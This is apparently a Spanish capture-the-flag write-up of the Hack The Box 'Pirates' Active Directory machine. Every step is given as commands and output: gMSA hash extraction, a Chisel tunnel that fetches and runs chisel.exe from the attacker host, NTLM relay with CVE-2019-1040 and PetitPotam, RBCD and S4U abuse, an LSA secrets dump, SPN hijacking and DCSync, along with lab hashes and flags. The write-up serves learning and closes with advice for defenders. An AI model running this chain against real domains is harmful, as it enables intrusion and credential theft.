Resumen Ejecutivo

Pirates es una máquina Windows Active Directory de dificultad Hard. Partiendo con credenciales de bajo privilegio (pentest:p3nt3st2025!&), la cadena de ataque encadena 8 técnicas avanzadas de AD:


1. Explotación del grupo Pre-Windows 2000 Compatible Access para obtener TGT de MS01$ con contraseña trivial.
2. Extracción de hashes NTLM de cuentas gMSA vía LDAPS autenticado con Kerberos.
3. Tunneling a red interna mediante Chisel SOCKS5 a través del DC01.
4. NTLM Relay con eliminación de MIC (CVE-2019-1040) para configurar RBCD en WEB01.
5. S4U2Self + S4U2Proxy para impersonar Administrator en WEB01 → user.txt.
6. Extracción de credenciales LSA plaintext: contraseña de a.white.
7. Abuso de ForceChangePassword para comprometer a.white_adm.
8. KCD con Protocol Transition + SPN Hijacking en DC01$ → DCSync → root.txt.

🔐 Explotación Paso a Paso

Paso 1 — Pre-Windows 2000 Compatible Access — TGT para MS01$
¿Qué es el grupo Pre-Windows 2000 Compatible Access?

En entornos heredados de Windows NT, las cuentas de máquina creadas con ese flag tienen como contraseña inicial el propio nombre de la cuenta en minúsculas (sin el $). Si el administrador nunca cambia esa contraseña, cualquier atacante puede autenticarse como esa cuenta.

⚠️ Clock Skew — Sincronizar reloj SIEMPRE antes de Kerberos

Kerberos requiere que el reloj del atacante no difiera más de 5 minutos del KDC. Esta máquina tiene un offset de +7 horas. Ejecutar sudo ntpdate -u DC_IP antes de cada operación.

# Sincronizar reloj con el DC $ sudo ntpdate -u 10.129.244.95 # Verificar cuentas Pre-W2K $ nxc ldap 10.129.244.95 -u 'pentest' -p $'p3nt3st2025!&' -d pirate.htb -M pre2k # Obtener TGT para MS01$ con contraseña trivial $ impacket-getTGT pirate.htb/'MS01$':ms01 -dc-ip 10.129.244.95
Output
[*] Saving ticket in MS01$.ccache
Interpretación

TGT obtenido para MS01$. Con este ticket realizamos operaciones LDAP autenticadas como esa cuenta de máquina, que pertenece al grupo "Domain Secure Servers" con permiso para leer contraseñas gMSA.

Paso 2 — Extracción de hashes NTLM de cuentas gMSA vía LDAPS
¿Qué son las gMSA?

Group Managed Service Accounts: cuentas especiales de AD cuya contraseña gestiona automáticamente el DC. Solo los objetos listados en msDS-ManagedPasswordAllowedTo pueden leer el hash NTLM actual.

$ export KRB5CCNAME=/home/kali/MS01\$.ccache $ nxc ldap 10.129.244.95 -u 'MS01$' -p ms01 -d pirate.htb --gmsa -k
Output
LDAP DC01 [+] pirate.htb\MS01$:ms01 LDAP DC01 [*] Getting GMSA Passwords LDAP DC01 Account: gMSA_ADCS_prod$ NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea LDAP DC01 Account: gMSA_ADFS_prod$ NTLM: fd9ea7ac7820dba5155bd6ed2d850c09
Interpretación

Obtenemos los hashes NTLM de ambas gMSA. gMSA_ADCS_prod$ da acceso WinRM al DC01; gMSA_ADFS_prod$ da acceso WinRM a WEB01 vía túnel.

Decisión

Usamos gMSA_ADCS_prod$ (hash 25c7f0eb…) para conectar al DC01 via Evil-WinRM y desplegar Chisel hacia la red interna.

Paso 3 — WinRM a DC01 + Despliegue de Chisel SOCKS5 hacia WEB01
¿Por qué necesitamos Chisel?

WEB01 (192.168.100.2) está en una red interna no alcanzable desde Kali. Chisel actúa como proxy SOCKS5 inverso a través del DC01 dual-homed.

# Kali: iniciar servidor Chisel en reverso $ chisel server -p 8888 --reverse # Servir chisel.exe via HTTP $ python3 -m http.server 9090 & # Conectar al DC01 y ejecutar cliente Chisel $ printf 'Invoke-WebRequest "http://10.10.14.154:9090/chisel.exe" -OutFile "C:\\Windows\\Temp\\chisel.exe"\nStart-Process "C:\\Windows\\Temp\\chisel.exe" -Args "client 10.10.14.154:8888 R:1080:socks" -WindowStyle Hidden\nexit\n' | evil-winrm -i 10.129.244.95 -u 'gMSA_ADCS_prod$' -H '25c7f0eb586ed3a91375dbf2f6e4a3ea'
Output
2026/03/31 server: session#1: tun: proxy#R:1080=>socks: Listening
Interpretación

Proxy SOCKS5 activo en 127.0.0.1:1080. Cualquier comando con proxychains -q tiene acceso a la red 192.168.100.0/24.

Paso 4 — NTLM Relay + RBCD — CVE-2019-1040
¿Cómo funciona este ataque?

(1) CVE-2019-1040: Permite eliminar el MIC del NTLM AUTHENTICATE → relay a LDAP sin signing.
(2) RBCD: machineAccountQuota permite crear cuentas de máquina. Relay la auth de WEB01$ al LDAP del DC y escribimos RBCD en WEB01$.

# ntlmrelayx: captura auth NTLM de WEB01 → relay al LDAP del DC $ impacket-ntlmrelayx -t ldap://10.129.244.95 --remove-mic --delegate-access -smb2support # Coercionar a WEB01 para que autentique hacia Kali $ proxychains -q nxc smb 192.168.100.2 -u 'pentest' -p $'p3nt3st2025!&' -d pirate.htb -M coerce_plus -o LISTENER=10.10.14.154
Output
COERCE_PLUS WEB01 Exploit Success, efsrpc\EfsRpcAddUsersToFile [PetitPotam] [ntlmrelayx] Authenticating PIRATE/WEB01$@10.129.244.95 against ldap://10.129.244.95 SUCCEED [ntlmrelayx] Adding new computer: AOOMPUJF$ password: 5}m2Xd1+_jP5cg3 result: OK [ntlmrelayx] Delegation rights modified successfully! [ntlmrelayx] AOOMPUJF$ can now impersonate users on WEB01$ via S4U2Proxy
Interpretación

ntlmrelayx creó AOOMPUJF$ y habilitó RBCD en WEB01$. El nombre cambia en cada sesión.

Paso 5 — S4U2Proxy — Impersonar Administrator en WEB01 → user.txt
¿Qué son S4U2Self y S4U2Proxy?

S4U2Self: obtiene ticket de servicio para sí misma en nombre de cualquier usuario.
S4U2Proxy: usa ese ticket para solicitar acceso en otros destinos configurados en RBCD → ticket CIFS/WEB01 como Administrator.

$ impacket-getTGT pirate.htb/'AOOMPUJF$':'5}m2Xd1+_jP5cg3' -dc-ip 10.129.244.95 $ export KRB5CCNAME=/home/kali/AOOMPUJF\$.ccache # S4U2Self + S4U2Proxy → ticket CIFS/WEB01 como Administrator $ impacket-getST pirate.htb/'AOOMPUJF$':'5}m2Xd1+_jP5cg3' -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.244.95 $ export KRB5CCNAME=/home/kali/Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache # Ejecutar como Administrator en WEB01 $ proxychains -q impacket-wmiexec -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb -dc-ip 10.129.244.95 'type C:\Users\a.white\Desktop\user.txt'
Output
[*] Impersonating Administrator [*] Requesting S4U2self / S4U2Proxy [*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache pirate\administrator 6ab389236172453a8e7ee30d7e35b9f5
Paso 6 — LSA Secrets Dump en WEB01 → Contraseña de a.white
¿Qué son los LSA Secrets?

Almacén cifrado en el registro de Windows donde el sistema guarda credenciales de servicios y AutoLogon. WEB01 usa AutoLogon con a.white, almacenando su contraseña en texto plano.

$ proxychains -q nxc smb WEB01.pirate.htb -u 'Administrator' --use-kcache --lsa
Output
SMB WEB01 [+] pirate.htb\Administrator from ccache (Pwn3d!) SMB WEB01 [*] Dumping LSA secrets SMB WEB01 PIRATE\a.white:E2nvAOKSz5Xz2MJu SMB WEB01 [+] Dumped 9 LSA secrets
Interpretación

Contraseña en texto claro: a.white:E2nvAOKSz5Xz2MJu. Válida en el dominio, punto de entrada al siguiente escalón.

Paso 7 — ForceChangePassword: a.white → compromete a.white_adm
¿Qué es ForceChangePassword?

El derecho extendido User-Force-Change-Password permite cambiar la contraseña de otro usuario sin conocer la actual. a.white_adm tiene KCD con Protocol Transition + WriteSPN sobre DC01$.

$ rpcclient -U 'pirate.htb/a.white%E2nvAOKSz5Xz2MJu' 10.129.244.95 -c 'setuserinfo2 a.white_adm 23 "Pirate2026!!"' $ nxc ldap 10.129.244.95 -u 'a.white_adm' -p 'Pirate2026!!' -d pirate.htb
Output
LDAP DC01 [+] pirate.htb\a.white_adm:Pirate2026!!
Interpretación

Contraseña de a.white_adm cambiada exitosamente. Tiene atributos de delegación necesarios para el paso final.

Paso 8 — KCD + Protocol Transition + SPN Hijacking → DCSync → root.txt
¿Cómo funciona KCD + SPN Hijacking?

KCD: a.white_adm tiene msDS-AllowedToDelegateTo: HTTP/WEB01.pirate.htb con T2A4D → S4U2Self para cualquier usuario + S4U2Proxy al SPN configurado.
SPN Hijack: a.white_adm tiene WriteSPN sobre DC01$. Mover HTTP/WEB01.pirate.htb a DC01$ → el KDC cifra el ticket con la clave del DC01 → con -altservice cifs/DC01.pirate.htb el ticket es válido para CIFS en DC01 → DCSync.

# 1. Mover SPN HTTP/WEB01.pirate.htb: de WEB01$ → a DC01$ $ python3 -c " import ldap3 conn = ldap3.Connection( ldap3.Server('10.129.244.95', get_info=ldap3.ALL), user='pirate.htb\\\\a.white_adm', password='Pirate2026!!', authentication=ldap3.NTLM, auto_bind=True) conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb','HTTP/WEB01'])]}) conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb','HTTP/WEB01'])]}) print('SPN movido OK')" # 2. Obtener TGT de a.white_adm $ impacket-getTGT pirate.htb/a.white_adm:'Pirate2026!!' -dc-ip 10.129.244.95 $ export KRB5CCNAME=/home/kali/a.white_adm.ccache # 3. S4U2Self + S4U2Proxy + altservice → cifs/DC01 $ impacket-getST pirate.htb/a.white_adm:'Pirate2026!!' -spn HTTP/WEB01.pirate.htb -impersonate Administrator -altservice cifs/DC01.pirate.htb -dc-ip 10.129.244.95 # 4. DCSync $ export KRB5CCNAME=/home/kali/Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache $ impacket-secretsdump -k -no-pass pirate.htb/Administrator@DC01.pirate.htb -dc-ip 10.129.244.95 -just-dc-user Administrator
Output
[*] Impersonating Administrator [*] Changing service from HTTP/WEB01.pirate.htb to cifs/DC01.pirate.htb [*] Saving ticket in Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::

📚 Lecciones Aprendidas

⚔ Para el Atacante

  • gMSA hashes son estables en HTB — no rotan al resetear la máquina.
  • Clock skew es el enemigo silencioso — sudo ntpdate -u DC_IP antes de cada operación Kerberos.
  • -smb2support es crítico en ntlmrelayx con Windows Server 2019.
  • -altservice en getST permite reescribir el SPN del ticket → acceso a cualquier servicio.

🛡 Para el Defensor

  • Auditar cuentas Pre-W2K y remediar contraseña = sAMAccountName.
  • LDAP Signing y Channel Binding eliminan la mayoría de relay NTLM a LDAP.
  • SMB Signing en todos los hosts, no solo el DC.
  • LSA Protection (RunAsPPL) impide extracción de LSA secrets. No usar AutoLogon con texto plano.
  • Auditar ForceChangePassword y WriteSPN con BloodHound regularmente.

📖 Glosario

gMSAGroup Managed Service Account — cuenta cuya contraseña gestiona automáticamente el DC.
NTLM RelayAtaque que intercepta auth NTLM y la retransmite a otro servicio como la víctima.
RBCDResource-Based Constrained Delegation — permite a un servicio actuar en nombre de usuarios.
S4U2Self / S4U2ProxyExtensiones Kerberos para obtener tickets de servicio en nombre de cualquier usuario.
KCDKerberos Constrained Delegation — limita delegación a servicios específicos.
SPN HijackingMover un SPN a otro objeto para que el KDC cifre el ticket con otra clave.
